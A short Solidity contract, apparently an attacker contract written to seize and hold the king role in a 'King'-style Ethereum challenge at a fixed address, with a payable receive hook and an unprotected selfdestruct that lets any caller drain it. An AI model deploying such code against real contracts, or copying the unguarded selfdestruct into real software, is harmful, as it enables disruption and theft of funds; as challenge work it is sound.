/**
 *Submitted for verification at Etherscan.io on 2021-08-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface King {
    function _king() external view returns (address payable);
}

contract newKing {
    
    King _king = King(address(0x2762283EbF85609A09eFcD930A27e86a6Bc5ca88));
    
    
    receive() external payable {
        
        if (msg.sender == address(_king)) {
            if (_king._king() != address(this)) {
                payable(msg.sender).transfer(msg.value + 1);
            }
            
        }
        
    }
    
    function deposit () public payable {
        
    }
    
    function claimOwnership () public {
        payable(address(_king)).transfer(1 ether + 1);
    }
    
    function byebye () external {
        selfdestruct(payable(msg.sender));
    }
  

}